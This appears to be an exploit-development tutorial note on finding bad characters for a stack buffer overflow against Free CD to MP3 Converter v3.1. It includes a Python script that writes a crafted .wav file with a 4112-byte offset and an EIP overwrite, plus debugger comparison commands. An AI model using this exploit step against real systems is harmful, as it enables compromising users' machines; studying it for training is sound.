# Stack Based Buffer Overflow 
##  Exploiting Free CD to MP3 Converter v3.1

> Before we control ther EIP, we need to determine any characters we need to avoid using in our payload

It is important to find bad chars because depending on the processing each program executes on our input, certain characters may tell the program that it has reached the end of the input. This may happen even though it may not have reached the end of the input yet.

### Generating Bad characters

To generate bad characters, we can use the ERC plugin and generate a .bin file and a .txt file 
To do so, we can use the `ERC --bytearray` command

Next step is to update our code:
```
def bad_chars():
    all_chars = bytes([
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07...
    ])
    
    offset = 4112
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars
    
    with open('chars.wav', 'wb') as f:
        f.write(payload)

bad_chars()
```
Now we load this .wav file in and see if there are any differences bertween our input in memory and the .bin file.

### Comparing Input 

First need to copy the ESP address: `0014F974`, then runnning the command:
`ERC --compare 0014F974 C:\Users\testing\Desktop\ByteArray_1.bin`

This command compares byte by byte both our input and chars we generated  

![](../../../Assets/Pasted%20image%2020220723014521.jpg) 

As we see the null byte %00 has truncated the reamining input, so it is a bad character.

Now we try again with elimating bad characters: `ERC --bytearray -bytes 0x00`

After running the .wav file and loading into the debugger, we can see that both the inputs match
`
Now we know to avoid 0x00 In our EIP address or shellcode.

**Characters such as `0x00`, `0x0a`, `0x0d` are generally bad characters**
